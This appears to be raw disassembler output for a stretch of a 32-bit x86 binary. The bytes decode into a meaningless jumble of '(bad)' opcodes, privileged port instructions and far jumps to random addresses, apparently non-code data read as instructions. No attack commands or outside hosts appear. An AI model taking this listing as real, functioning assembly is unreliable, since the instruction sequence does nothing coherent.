  4147df:	cwde   
  4147e0:	in     eax,0x3c
  4147e2:	outs   dx,DWORD PTR ds:[esi]
  4147e3:	mov    esi,edi
  4147e5:	jle    0x41483c
  4147e7:	add    BYTE PTR [ebp+0x40],dl
  4147ea:	mov    es,WORD PTR [esi+0x67]
  4147ed:	adc    DWORD PTR [esi+0x29],esi
  4147f0:	sub    esi,DWORD PTR [esi-0x57]
  4147f3:	test   cl,cl
  4147f5:	aaa    
  4147f6:	sbb    DWORD PTR [edx],edx
  4147f8:	xchg   edi,eax
  4147f9:	adc    eax,0xdaa8b63e
  4147fe:	or     DWORD PTR [ecx-0x64],eax
  414801:	mov    bh,BYTE PTR [ebx-0x4a56d718]
  414807:	and    eax,DWORD PTR [ecx-0x6]
  41480a:	sub    DWORD PTR [ecx-0x45754e79],edi
  414810:	xchg   ebx,eax
  414811:	push   ds
  414812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414813:	jecxz  0x4147a8
  414815:	rcr    BYTE PTR gs:[edx],0x43
  414819:	in     eax,dx
  41481a:	outs   dx,DWORD PTR ds:[esi]
  41481b:	cmp    dl,BYTE PTR [ecx+0x4c]
  41481e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41481f:	mov    eax,ds:0xf42b9cb7
  414824:	jmp    0x8331b8fa
  414829:	xor    DWORD PTR [ebp+0x43],eax
  41482c:	jnp    0x4147e9
  41482e:	jae    0x41482f
  414830:	sub    eax,esp
  414832:	adc    al,0x49
  414834:	popf   
  414835:	pushf  
  414836:	cli    
  414837:	add    cl,al
  414839:	mov    al,ds:0x205d7ba9
  41483e:	fdiv   QWORD PTR [edi]
  414840:	sub    al,0xc0
  414842:	inc    ebx
  414843:	mov    ah,bh
  414845:	inc    eax
  414846:	mov    al,ss:0x4a8b4527
  41484c:	cmp    cl,BYTE PTR [ebx]
  41484e:	shr    DWORD PTR [ebp+0xbe4136],1
  414854:	ins    BYTE PTR es:[edi],dx
  414855:	shr    ebx,cl
  414857:	jns    0x41487b
  414859:	cmp    edx,DWORD PTR [edx+0x65]
  41485c:	nop
  41485d:	and    DWORD PTR [ebx-0xd],esi
  414860:	jle    0x414880
  414862:	leave  
  414863:	mov    ah,0x5f
  414865:	jno    0x414838
  414867:	stos   BYTE PTR es:[edi],al
  414868:	daa    
  414869:	xchg   ebx,eax
  41486a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41486b:	dec    ebp
  41486c:	rcr    DWORD PTR [ebx-0x7646e643],cl
  414872:	stos   DWORD PTR es:[edi],eax
  414873:	and    eax,0xa8159ceb
  414878:	and    esp,DWORD PTR [esi+0xacc9320]
  41487e:	in     al,dx
  41487f:	push   edx
  414880:	sub    ebp,ecx
  414882:	or     eax,0x2daf088c
  414887:	scas   eax,DWORD PTR es:[edi]
  414888:	pcmpeqw mm6,QWORD PTR [edx-0x78]
  41488c:	pop    edx
  41488d:	inc    edx
  41488e:	dec    edi
  41488f:	pop    ecx
  414890:	sbb    eax,0x2155fc1a
  414895:	or     al,0xec
  414897:	gs nop
  414899:	jmp    0xeaee:0x2d66d603
  4148a0:	sbb    BYTE PTR [ebp+ebp*1+0x7c],dl
  4148a4:	dec    esi
  4148a5:	ja     0x4148a1
  4148a7:	mov    cl,0x1f
  4148a9:	xchg   ebp,eax
  4148aa:	outs   dx,DWORD PTR ds:[esi]
  4148ab:	mov    ch,BYTE PTR [ebp-0x78]
  4148ae:	fwait
  4148af:	or     BYTE PTR [ecx+0x62],dh
  4148b2:	lea    ebx,[edx]
  4148b4:	and    eax,0x8dfb1616
  4148b9:	imul   ebp,DWORD PTR ds:0x6f7a8264,0xa7ceda19
  4148c3:	jg     0x414849
  4148c5:	or     BYTE PTR [ecx],ch
  4148c7:	shl    BYTE PTR [ebx],1
  4148c9:	adc    al,0x21
  4148cb:	inc    esp
  4148cc:	jmp    0xed27:0x54346062
  4148d3:	enter  0xebcf,0x88
  4148d7:	stos   BYTE PTR es:[edi],al
  4148d8:	enter  0x6c7b,0xe9
  4148dc:	sub    al,0x1d
  4148de:	dec    eax
  4148df:	push   0x13
  4148e1:	in     al,dx
  4148e2:	popa   
  4148e3:	add    DWORD PTR gs:[edi],ebp
  4148e6:	xor    DWORD PTR [edx+0x2e],eax
  4148e9:	xor    edi,0xc2b28ec3
  4148ef:	stos   DWORD PTR es:[edi],eax
  4148f0:	ret    0xc5f6
  4148f3:	fsubrp st(5),st
  4148f5:	jae    0x4148d6
  4148f7:	jge    0x4148a8
  4148f9:	jns    0x4148c1
  4148fb:	inc    esp
  4148fc:	xchg   ebp,eax
  4148fd:	(bad)
  414901:	push   edi
  414902:	scas   eax,DWORD PTR es:[edi]
  414903:	lods   eax,DWORD PTR ds:[esi]
  414904:	ja     0x4148f6
  414906:	or     ah,BYTE PTR [edi]
  414908:	out    0xf3,al
  41490a:	dec    edx
  41490b:	js     0x4148df
  41490d:	and    cl,BYTE PTR [ecx]
  41490f:	(bad)  
  414911:	xor    DWORD PTR [edx],edx
  414913:	mov    esp,0x157c25f7
  414918:	or     edx,edi
  41491a:	sbb    BYTE PTR [ebp+0x43],0x43
  41491e:	jmp    0xd580:0xc1d296a3
  414925:	pop    esi
  414926:	add    DWORD PTR [ebp+0x6ea86656],esp
  41492c:	fcom   QWORD PTR [edx]
  41492e:	xchg   DWORD PTR [eax-0x321f67e0],ebx
  414934:	mov    al,ds:0x8ab20f00
  414939:	adc    al,0x35
  41493b:	das    
  41493c:	mov    dl,BYTE PTR [eax+0x4728aef5]
  414942:	xchg   ebp,eax
  414943:	fnstenv [esi]
  414945:	ret    0x685f
  414948:	lock in al,0x4a
  41494b:	loopne 0x41491f
  41494d:	cli    
  41494e:	and    eax,0x796d7cdc
  414953:	loop   0x414949
  414955:	fucomip st,st(2)
  414957:	sar    DWORD PTR [eax],cl
  414959:	push   eax
  41495a:	adc    eax,0x7547dcfc
  41495f:	mov    dl,0x43
  414961:	xchg   ecx,eax
  414962:	push   esi
  414963:	adc    eax,esp
  414965:	add    al,0xed
  414967:	push   edx
  414968:	es push ss
  41496a:	mov    ebx,0xf333ae20
  41496f:	retf   
  414970:	rol    edi,1
  414972:	push   ebx
  414973:	sbb    dl,BYTE PTR [edi-0x43fb364a]
  414979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41497a:	aad    0x7
  41497c:	stos   BYTE PTR es:[edi],al
  41497d:	xchg   ebx,eax
  41497e:	mov    bl,0x6e
  414980:	in     al,dx
  414981:	jl     0x414948
  414983:	retf   
  414984:	sub    eax,0x34624da0
  414989:	push   ds
  41498a:	ret    0xde51
  41498d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41498e:	pop    esi
  41498f:	pop    esi
  414990:	fs jmp 0x49de203f
  414996:	mov    eax,0xae31aa2
  41499b:	dec    ebp
  41499c:	pop    ebp
  41499d:	mov    esp,0x337a1a11
  4149a2:	sub    ebx,DWORD PTR [edi]
  4149a4:	jg     0x4149ab
  4149a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149a7:	sbb    eax,0xd29b27c5
  4149ac:	bnd jl 0x414a0e
  4149af:	in     al,dx
  4149b0:	(bad)  [esi+0x5c]
  4149b3:	xchg   BYTE PTR [edi+0x49d3a01c],cl
  4149b9:	pop    ebp
  4149ba:	push   0xffffffdf
  4149bc:	mov    edi,0xac66dd57
  4149c1:	jne    0x4149be
  4149c3:	ins    DWORD PTR es:[edi],dx
  4149c4:	nop
  4149c5:	js     0x4149be
  4149c7:	rcl    DWORD PTR [ecx+edi*4],0xeb
  4149cb:	sti    
  4149cc:	mov    ah,0xeb
  4149ce:	mov    edx,0x95523429
  4149d3:	mov    ecx,0xb71e50f
  4149d8:	jp     0x41496b
  4149da:	(bad)
  4149dd:	xor    bl,bl
  4149df:	pushf  
  4149e0:	jecxz  0x4149bd
  4149e2:	mov    DWORD PTR [ecx-0x1f733e90],edi
  4149e8:	add    al,0x73
  4149ea:	pop    ebp
  4149eb:	xchg   edx,eax
  4149ec:	std    
  4149ed:	fdiv   QWORD PTR ds:0xc467959c
  4149f3:	or     BYTE PTR [esi+0x35e805ab],dh
  4149f9:	cmp    ch,BYTE PTR ds:[esi+0x4f]
  4149fd:	xchg   edi,eax
  4149fe:	jb     0x414a67
  414a00:	outs   dx,DWORD PTR ds:[esi]
  414a01:	jecxz  0x414a46
  414a03:	inc    esi
  414a04:	xor    eax,0xfa7831c
  414a09:	out    dx,eax
  414a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a0b:	pop    ecx
  414a0c:	movaps xmm4,XMMWORD PTR [esi+0x62de5d74]
  414a13:	ficom  WORD PTR [edi+0x8]
  414a16:	dec    ecx
  414a17:	pushf  
  414a18:	lods   al,BYTE PTR ds:[esi]
  414a19:	addr16 in eax,0x9d
  414a1c:	pop    ecx
  414a1d:	and    cl,bl
  414a1f:	es je  0x414a2c
  414a22:	jmp    0x2f50b255
  414a27:	add    eax,0xc21d7a7f
  414a2c:	and    ah,BYTE PTR [edi]
  414a2e:	int3   
  414a2f:	sub    al,0xff
  414a31:	retf   0x3543
  414a34:	(bad)  
  414a35:	js     0x414a2e
  414a37:	data16 lock in al,0xe7
  414a3b:	imul   ebp,eax,0xffffff8e
  414a3e:	mov    WORD PTR [eax+0x7c38fa2c],?
  414a44:	int3   
  414a45:	mov    WORD PTR [edx+0x16418ecc],fs
  414a4b:	cwde   
  414a4c:	cmp    esp,esi
  414a4e:	mov    ah,0x52
  414a50:	xchg   DWORD PTR [ecx+0x7d],eax
  414a53:	cmp    ch,dl
  414a55:	push   ecx
  414a56:	adc    BYTE PTR [edx],ah
  414a58:	pop    eax
  414a59:	pop    esi
  414a5a:	dec    eax
  414a5b:	xor    edi,DWORD PTR ds:0xecfcd2c8
  414a61:	into   
  414a62:	ds shl bl,0x7a
  414a66:	mov    ebx,0xad3c2df1
  414a6b:	test   DWORD PTR [ecx],0xd83e2466
  414a71:	sub    al,0x15
  414a73:	loopne 0x414a25
  414a75:	cmp    al,0xdb
  414a77:	sub    esp,ecx
  414a79:	sub    DWORD PTR [ebp+esi*8+0x389df9e8],edi
  414a80:	dec    ecx
  414a81:	jge    0x414ab4
  414a83:	stos   DWORD PTR es:[edi],eax
  414a84:	dec    ecx
  414a85:	in     eax,dx
  414a86:	js     0x414a3f
  414a88:	mov    ch,0x3a
  414a8a:	dec    esp
  414a8b:	ret    0x106
  414a8e:	fbstp  TBYTE PTR [edi-0x7ee896ec]
  414a94:	xor    esi,ebx
  414a96:	push   0x10
  414a98:	jmp    0x414a75
  414a9a:	pusha  
  414a9b:	mov    esp,DWORD PTR [ecx]
  414a9d:	or     bl,al
  414a9f:	test   dl,ch
  414aa1:	sar    BYTE PTR [ecx+0x37bb3e4c],1
  414aa7:	clc    
  414aa8:	cmp    bl,BYTE PTR [eax]
  414aaa:	scas   al,BYTE PTR es:[edi]
  414aab:	mov    WORD PTR [ebx],fs
  414aad:	add    DWORD PTR [ecx+ecx*2-0xe],0x888ae0e3
  414ab5:	jno    0x414b27
  414ab7:	push   ebp
  414ab8:	add    cl,BYTE PTR [edx]
  414aba:	in     eax,0xac
  414abc:	rcr    BYTE PTR [ebx],cl
  414abe:	mov    WORD PTR [ebp+0x46],cs
  414ac1:	pop    esi
  414ac2:	add    al,cl
  414ac4:	jecxz  0x414a85
  414ac6:	cs mov cl,0x0
  414ac9:	shr    BYTE PTR [edi],1
  414acb:	in     al,dx
  414acc:	imul   edi,edi,0x70
  414acf:	test   BYTE PTR ds:0x1d541b2b,dl
  414ad5:	aas    
  414ad6:	and    al,0x1b
  414ad8:	add    ch,dh
  414ada:	pop    edx
  414adb:	inc    edi
  414adc:	pop    ss
  414add:	xor    edi,DWORD PTR [edx]
  414adf:	loop   0x414b19
  414ae1:	and    DWORD PTR [ebx-0x394c0b18],esp
  414ae7:	sub    edi,DWORD PTR [edx]
  414ae9:	(bad)  
  414aea:	fst    QWORD PTR [ebx-0x5f5877b7]
  414af0:	leave  
  414af1:	dec    ebp
  414af2:	and    dh,BYTE PTR [eax*2+0x15845ae2]
  414af9:	jl     0x414af4
  414afb:	add    al,0x8a
  414afd:	or     eax,0x42bc1589
  414b02:	push   eax
  414b03:	mov    dh,0x4e
  414b05:	jmp    0x65e0:0xe6d8505d
  414b0c:	add    bh,BYTE PTR [ebx+0x3d]
  414b0f:	add    BYTE PTR [ecx],bl
  414b11:	int    0x69
  414b13:	test   bl,dh
  414b15:	loop   0x414add
  414b17:	xchg   ebp,eax
  414b18:	iret   
  414b19:	jno    0x414b1a
  414b1b:	sti    
  414b1c:	jno    0x414b2f
  414b1e:	(bad)  
  414b1f:	fld    QWORD PTR [edi+ecx*8+0x1d]
  414b23:	cld    
  414b24:	js     0x414ab1
  414b26:	leave  
  414b27:	cmp    al,ch
  414b29:	dec    ebp
  414b2a:	call   0x4460:0x680bc371
  414b31:	ret    0x2c7
  414b34:	fsubr  DWORD PTR [ebx-0x80]
  414b37:	fwait
  414b38:	or     DWORD PTR [esi+0x73],0x4b149b18
  414b3f:	mov    dh,dl
  414b41:	ret    
  414b42:	dec    ecx
  414b43:	adc    BYTE PTR [esi],0x58
  414b46:	daa    
  414b47:	mov    ecx,0xbf7b058a
  414b4c:	sbb    bh,dl
  414b4e:	adc    bh,BYTE PTR [ebp+0x7c]
  414b51:	or     eax,0x550ca1b4
  414b56:	call   0x61de8a3d
  414b5b:	sub    dh,BYTE PTR [ecx+0x62]
  414b5e:	or     edx,DWORD PTR [esi+0x2d2381c6]
  414b64:	inc    ebx
  414b65:	das    
  414b66:	je     0x414b60
  414b68:	adc    DWORD PTR [ecx+0x51],edx
  414b6b:	out    0x50,eax
  414b6d:	inc    ecx
  414b6e:	retf   
  414b6f:	imul   ecx,DWORD PTR [edi],0x3e541af4
  414b75:	pusha  
  414b76:	dec    edx
  414b77:	in     eax,0x91
  414b79:	sbb    DWORD PTR [ecx+0x12ddb971],esi
  414b7f:	nop
  414b80:	into   
  414b81:	in     eax,0xea
  414b83:	push   eax
  414b84:	xchg   edi,eax
  414b85:	jo     0x414bc4
  414b87:	ins    DWORD PTR es:[edi],dx
  414b88:	iret   
  414b89:	and    edx,esp
  414b8b:	xchg   edx,eax
  414b8c:	stos   DWORD PTR es:[edi],eax
  414b8d:	test   al,0x7
  414b8f:	ins    DWORD PTR es:[edi],dx
  414b90:	push   ecx
  414b91:	xor    cl,bh
  414b93:	cwde   
  414b94:	iret   
  414b95:	xchg   edx,eax
  414b96:	xor    al,0xbc
  414b98:	and    eax,0xa31abacb
  414b9d:	bound  esi,QWORD PTR [edi+0x64]
  414ba0:	dec    edx
  414ba1:	outs   dx,DWORD PTR ds:[esi]
  414ba2:	lock dec esi
  414ba4:	dec    ebp
  414ba5:	mov    dl,0xfd
  414ba7:	out    0xdd,eax
  414ba9:	pop    es
  414baa:	les    esp,FWORD PTR [edi+0x2b31ce2e]
  414bb0:	out    0x70,eax
  414bb2:	fnsave [esi]
  414bb4:	dec    DWORD PTR [eax-0x2f]
  414bb7:	fwait
  414bb8:	pop    edx
  414bb9:	and    al,0x6
  414bbb:	iret   
  414bbc:	cmp    cl,dl
  414bbe:	(bad)  
  414bbf:	push   edx
  414bc0:	dec    edi
  414bc1:	in     al,0x20
  414bc3:	nop    DWORD PTR [esi]
  414bc6:	xchg   edi,eax
  414bc7:	pop    ss
  414bc8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  414bca:	mov    ds:0x4e168e94,al
  414bcf:	mov    WORD PTR [eax+0x39eb89ab],fs
  414bd5:	mov    dh,0xdb
  414bd7:	test   DWORD PTR [eax+0x41],esi
  414bda:	mov    ch,0x1d
  414bdc:	or     ebx,DWORD PTR [ebx+0x3cb68d19]
  414be2:	sti    
  414be3:	js     0x414b74
  414be5:	mov    esi,0x2cde131f
  414bea:	mov    al,ds:0xa9a0cf7e
  414bef:	dec    esp
  414bf0:	(bad)  
  414bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bf2:	push   0xffffffa0
  414bf4:	test   BYTE PTR [edx-0x43d81e2e],dl
  414bfa:	sbb    eax,DWORD PTR [edx-0x1e90f9e4]
  414c00:	mov    ebx,0x2b2f9b9e
  414c05:	jmp    0x52d0bc7e
  414c0a:	jmp    0xd5d3:0x4cbf1f13
  414c11:	mov    dl,0xaa
  414c13:	jae    0x414bf5
  414c15:	aas    
  414c16:	cmp    eax,0x1fd44b6a
  414c1b:	ins    DWORD PTR es:[edi],dx
  414c1c:	fs mov eax,0x53781302
  414c22:	ja     0x414bce
  414c24:	jb     0x414c6f
  414c26:	sbb    bl,al
  414c28:	cwde   
  414c29:	pop    ss
  414c2a:	cmp    eax,0xbfe83990
  414c2f:	fs fiadd DWORD PTR ss:[edi+eiz*1]
  414c34:	scas   al,BYTE PTR es:[edi]
  414c35:	mov    ebp,0xe04072ae
  414c3a:	mov    edi,ds
  414c3c:	pushf  
  414c3d:	xchg   ecx,eax
  414c3e:	sbb    DWORD PTR [edx-0x3db6af69],0x2e
  414c45:	test   BYTE PTR [esi+0x46],dh
  414c48:	lods   al,BYTE PTR ds:[esi]
  414c49:	leave  
  414c4a:	mov    ds:0x1e51240e,al
  414c4f:	push   ecx
  414c50:	push   ds
  414c51:	mov    ecx,0x11e0f25d
  414c56:	ret    0xd938
  414c59:	fist   DWORD PTR [ebx+0x3d]
  414c5c:	fnsave [ebp-0x42d72823]
  414c62:	in     al,dx
  414c63:	mov    dh,0x39
  414c65:	nop
  414c66:	mov    ebx,0xc53834d3
  414c6b:	sbb    al,0x30
  414c6d:	dec    edi
  414c6e:	inc    ebp
  414c6f:	int3   
  414c70:	ins    BYTE PTR es:[edi],dx
  414c71:	jecxz  0x414ccd
  414c73:	mov    dh,0x84
  414c75:	mov    ch,0xff
  414c77:	push   ebx
  414c78:	cwde   
  414c79:	test   eax,0x291eaf1d
  414c7e:	adc    eax,0x1b6745c0
  414c83:	ins    BYTE PTR es:[edi],dx
  414c84:	inc    edi
  414c85:	or     ebx,DWORD PTR [ebx]
  414c87:	out    0x68,eax
  414c89:	cmp    eax,0x9700fb1d
  414c8e:	lock popf 
  414c90:	adc    eax,0x71632d47
  414c95:	sub    al,0x77
  414c97:	pop    ebx
  414c98:	sti    
  414c99:	push   ebp
  414c9a:	adc    dh,BYTE PTR es:[edi+0x10]
  414c9e:	data16 cs cmc 
  414ca1:	aaa    
  414ca2:	in     eax,0x73
  414ca4:	pop    es
  414ca5:	ds pop edx
  414ca7:	adc    ebp,DWORD PTR [edi+0x37d2d231]
  414cad:	lods   al,BYTE PTR ds:[esi]
  414caf:	push   ecx
  414cb0:	inc    ecx
  414cb1:	sbb    BYTE PTR [ecx-0x3f33e1ea],0x3b
  414cb8:	ds sub dh,ah
  414cbb:	in     al,0x4b
  414cbd:	out    dx,eax
  414cbe:	call   0xf79c:0xf159ffc8
  414cc5:	xchg   edx,eax
  414cc6:	or     esi,ebp
  414cc8:	fisub  DWORD PTR [edx-0x5]
  414ccb:	mov    bh,0x44
  414ccd:	int    0x22
  414ccf:	cwde   
  414cd0:	rcpps  xmm0,XMMWORD PTR ds:0x5ea23913
  414cd7:	sbb    al,0x81
  414cd9:	push   ebp
  414cda:	imul   esi,ebp,0x406d4980
  414ce0:	sub    al,0x6
  414ce2:	mov    edx,0x8c4ec59a
  414ce7:	jl     0x414d35
  414ce9:	xchg   edx,ebx
  414ceb:	jns    0x414d39
  414ced:	jb     0x414d44
  414cef:	inc    DWORD PTR [esi-0x24]
  414cf2:	or     bh,BYTE PTR [ecx-0x14]
  414cf5:	sub    ecx,DWORD PTR [ebp+0x4]
  414cf8:	jmp    0x414d25
  414cfa:	(bad)
  414cfd:	jecxz  0x414d31
  414cff:	mov    edi,es
  414d01:	jo     0x414d51
  414d03:	push   esp
  414d04:	push   ds
  414d05:	sti    
  414d06:	idiv   BYTE PTR [edi]
  414d08:	sti    
  414d09:	idiv   BYTE PTR [esi-0x37]
  414d0c:	xlat   BYTE PTR ds:[ebx]
  414d0d:	into   
  414d0e:	aad    0x69
  414d10:	sub    eax,0x1d36fe97
  414d15:	cmp    ebx,DWORD PTR [ecx]
  414d17:	or     DWORD PTR [ebp+ebp*4-0x56],edi
  414d1b:	lock fcomp st(0)
  414d1e:	and    ebx,edx
  414d20:	sti    
  414d21:	shl    ch,0x51
  414d24:	pushf  
  414d25:	fnsave [eax+eiz*2+0x5f]
  414d29:	jo     0x414cff
  414d2b:	adc    bh,BYTE PTR [edi+0x43]
  414d2e:	mov    cs,ebp
  414d30:	dec    eax
  414d31:	push   ecx
  414d32:	dec    ebx
  414d33:	stos   BYTE PTR es:[edi],al
  414d34:	call   0x1298:0xe605e584
  414d3b:	push   edx
  414d3c:	out    dx,al
  414d3d:	in     al,0x27
  414d3f:	scas   eax,DWORD PTR es:[edi]
  414d40:	sbb    BYTE PTR [eax-0x26cc15ec],cl
  414d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d47:	pop    edi
  414d48:	enter  0x3a7c,0x54
  414d4c:	or     ebx,DWORD PTR [ecx-0x7ee1ffc5]
  414d52:	jbe    0x414d98
  414d54:	pop    edx
  414d55:	nop
  414d56:	pushf  
  414d57:	and    ebx,DWORD PTR [edi-0x78]
  414d5a:	inc    eax
  414d5b:	(bad)  
  414d5c:	rol    BYTE PTR [edi+0x2c83a176],0x39
  414d63:	sbb    dh,0xcf
  414d66:	sbb    BYTE PTR [esi+0x55],dl
  414d69:	je     0x414dc5
  414d6b:	mov    dl,0x11
  414d6d:	pop    es
  414d6e:	cld    
  414d6f:	jge    0x414d1d
  414d71:	outs   dx,DWORD PTR ds:[esi]
  414d72:	xchg   BYTE PTR [ecx],dl
  414d74:	f2xm1  
  414d76:	jbe    0x414d79
  414d78:	push   ebx
  414d79:	mov    esp,0xff30cff2
  414d7e:	ds jecxz 0x414d21
  414d81:	dec    ecx
  414d82:	fs lock ja 0x414d90
  414d86:	xor    al,0xe7
  414d88:	xor    al,0x75
  414d8a:	xchg   esi,eax
  414d8b:	sti    
  414d8c:	and    al,0x4f
  414d8e:	shl    BYTE PTR [ecx-0x37],0xd8
  414d92:	repnz loope 0x414d2a
  414d95:	out    0x5a,al
  414d97:	div    BYTE PTR [ebx+0x1b]
  414d9a:	and    bh,BYTE PTR [eax+0x3bc5e579]
  414da0:	lock pop eax
  414da2:	addr16 je 0x414dfd
  414da5:	test   eax,0xc56ca1bb
  414daa:	xchg   BYTE PTR [ebx+0xc],cl
  414dad:	dec    ebp
  414dae:	icebp  
  414daf:	outs   dx,DWORD PTR ds:[esi]
  414db0:	fstp   st(7)
  414db2:	or     eax,DWORD PTR [ebp+0x7c]
  414db5:	lahf   
  414db6:	imul   esi,DWORD PTR [esp+edx*4-0x2cf9a35b],0xffffffa4
  414dbe:	pushf  
  414dbf:	sbb    dh,dh
  414dc1:	xor    DWORD PTR [ebx],ebp
  414dc3:	out    dx,eax
  414dc4:	pop    ss
  414dc5:	mov    edx,DWORD PTR [esp+eiz*2-0x17]
  414dc9:	mov    ah,0x15
  414dcb:	xchg   ebx,eax
  414dcc:	test   eax,0x7343b0aa
  414dd1:	lock ins DWORD PTR es:[edi],dx
  414dd3:	or     eax,0x1627dcf6
  414dd8:	mov    esi,0x9d81eaa1
  414ddd:	pop    ebp
  414dde:	out    0x2d,al
  414de0:	add    DWORD PTR [edx+eax*4],esi
  414de3:	sub    cl,BYTE PTR [ebp+0x1a4acbe3]
  414de9:	out    dx,al
  414dea:	add    bl,BYTE PTR [edx+0x10]
  414ded:	lds    ebx,FWORD PTR [eax-0x41]
  414df0:	inc    eax
  414df1:	sbb    BYTE PTR [edx+0x7],bl
  414df4:	mov    ebx,0x9b09a7ae
  414df9:	inc    esi
  414dfa:	out    0xc2,eax
  414dfc:	jp     0x414da3
  414dfe:	pushf  
  414dff:	int    0x70
  414e01:	lock mov BYTE PTR [ebx-0x12dbd3f0],dl
  414e08:	pop    ebx
  414e09:	pop    ecx
  414e0a:	ss push 0x351b5cba
  414e10:	jnp    0x414e0b
  414e12:	pop    ecx
  414e13:	fs stc 
  414e15:	fild   QWORD PTR [edi+0x10]
  414e18:	in     al,dx
  414e19:	(bad)  
  414e1b:	inc    ebp
  414e1c:	out    0xc,al
  414e1e:	dec    edi
  414e1f:	or     DWORD PTR [edx-0x2ae6fde],ecx
  414e25:	sar    ebx,1
  414e27:	stc    
  414e28:	lock dec ebp
  414e2a:	or     al,0x3e
  414e2c:	retf   0xc0df
  414e2f:	scas   eax,DWORD PTR es:[edi]
  414e30:	pushf  
  414e31:	mov    dl,0x50
  414e33:	mov    ebx,0xc829926b
  414e38:	mov    eax,ds:0xc34b8152
  414e3e:	ror    BYTE PTR [ecx-0x51],1
  414e41:	mov    edi,0x720f5d2f
  414e46:	test   al,0x26
  414e48:	iret   
  414e49:	xor    DWORD PTR [edx+0x5286bb87],ecx
  414e4f:	sub    eax,0xea62f04f
  414e54:	shl    edx,0xc4
  414e57:	or     ecx,DWORD PTR gs:[esi+0x4]
  414e5b:	pop    ds
  414e5c:	cmp    BYTE PTR [ebx],0x5d
  414e5f:	aaa    
  414e60:	xor    BYTE PTR [edi+0x3fc82b41],dh
  414e66:	lods   al,BYTE PTR ds:[esi]
  414e67:	cdq    
  414e68:	xor    al,0xbe
  414e6a:	and    eax,0x6909e41d
  414e6f:	and    al,0x2e
  414e72:	cmp    bl,BYTE PTR [eax]
  414e74:	and    BYTE PTR [ecx],bl
  414e76:	dec    ebp
  414e77:	mov    ebp,0x9b3b9ba5
  414e7c:	inc    esi
  414e7d:	xchg   esp,eax
  414e7e:	mov    dl,0x7b
  414e80:	sbb    BYTE PTR [esi+0x575c901c],bh
  414e86:	sub    DWORD PTR [edx],0x84e6bb0c
  414e8c:	or     al,0x2
  414e8e:	jl     0x414e1f
  414e90:	jmp    0xf92e:0xd6e0efa0
  414e97:	(bad)  
  414e99:	pop    ss
  414e9a:	fst    DWORD PTR [esi+ebx*8]
  414e9d:	das    
  414e9e:	addr16 inc esi
  414ea0:	sti    
  414ea1:	jmp    0xf174e3dd
  414ea6:	ins    DWORD PTR es:[edi],dx
  414ea7:	lea    ebp,[esi+0x2e]
  414eaa:	jmp    0x7bd5:0x85b08e9d
  414eb1:	jae    0x414ed4
  414eb3:	fsub   QWORD PTR [edi+0x7022d378]
  414eb9:	adc    dh,BYTE PTR [eax-0x16e92bfa]
  414ebf:	call   0xce2fd138
  414ec4:	push   esi
  414ec5:	xchg   esp,eax
  414ec6:	lds    edx,FWORD PTR [ebx+0x34897949]
  414ecc:	scas   al,BYTE PTR es:[edi]
  414ecd:	(bad)
  414ed1:	(bad)  
  414ed2:	sbb    al,0xc2
  414ed4:	lods   al,BYTE PTR ds:[esi]
  414ed5:	jnp    0x414ecf
  414ed7:	retf   0x52b3
  414eda:	sahf   
  414edb:	jl     0x414ea2
  414edd:	xor    al,BYTE PTR [esi]
  414edf:	adc    bh,BYTE PTR [edx]
  414ee1:	jno    0x414e7a
  414ee3:	not    BYTE PTR [edi]
  414ee5:	xor    eax,0xe0afce6f
  414eea:	add    eax,DWORD PTR [edi+ecx*2-0x18]
  414eee:	mov    esp,0xe8d7db9f
  414ef3:	mov    eax,ds:0xa0d56465
  414ef8:	ins    BYTE PTR es:[edi],dx
  414ef9:	in     eax,dx
  414efa:	fsubr  DWORD PTR [edx+0x633cb509]
  414f00:	mov    eax,0xaee19bd
  414f05:	repz and al,0xca
  414f08:	sbb    al,0x15
  414f0a:	call   0x48237577
  414f0f:	(bad)  
  414f10:	fs mov esp,0xae2a573d
  414f16:	sbb    bh,BYTE PTR [ecx]
  414f18:	pop    ecx
  414f19:	fisubr WORD PTR [esi]
  414f1b:	cdq    
  414f1c:	ins    DWORD PTR es:[edi],dx
  414f1d:	ror    DWORD PTR [ebx-0x547e8b7c],cl
  414f23:	dec    eax
  414f24:	xchg   BYTE PTR [esi],ch
  414f26:	mov    ecx,DWORD PTR [edx+0x2ec4a4ae]
  414f2c:	or     al,0x5a
  414f2f:	jnp    0x414f72
  414f31:	sub    dh,cl
  414f33:	jnp    0x414f9c
  414f35:	int    0xeb
  414f37:	pop    edx
  414f38:	in     al,dx
  414f39:	cmp    al,0x77
  414f3b:	sti    
  414f3c:	adc    BYTE PTR [esi],0x52
  414f3f:	mov    cl,0x2f
  414f41:	and    BYTE PTR [ebx],0x54
  414f44:	js     0x414fc1
  414f46:	leave  
  414f47:	sbb    eax,0x7af491ab
  414f4c:	xchg   ebx,eax
  414f4d:	xchg   esp,eax
  414f4e:	adc    DWORD PTR [esi],ecx
  414f50:	imul   ecx,esi,0x6d
  414f53:	inc    edx
  414f54:	and    al,BYTE PTR [edi+0x5f]
  414f57:	mov    ah,bl
  414f59:	mov    WORD PTR [edi+0x45be125f],?
  414f5f:	cmp    cl,al
  414f61:	(bad)  
  414f62:	cld    
  414f63:	clc    
  414f64:	mov    dl,0x3d
  414f66:	iret   
  414f67:	popf   
  414f68:	call   0x1b555b8b
  414f6d:	and    eax,0xcc1c832e
  414f72:	lods   al,BYTE PTR ds:[esi]
  414f73:	std    
  414f74:	in     eax,0x92
  414f76:	mov    esi,0x8ebfaf17
  414f7b:	test   eax,0xa6ca779c
  414f80:	div    ecx
  414f82:	das    
  414f83:	mov    eax,ds:0x3c916591
  414f88:	addr16 imul edx,esp,0xa09cb3dd
  414f8f:	mov    dl,0x2c
  414f91:	icebp  
  414f92:	(bad)  
  414f93:	int    0xcc
  414f95:	stos   BYTE PTR es:[edi],al
  414f96:	jg     0x414f69
  414f98:	mov    ebx,DWORD PTR [edi-0x4f]
  414f9b:	fst    DWORD PTR [ecx]
  414f9d:	jo     0x414f94
  414f9f:	lahf   
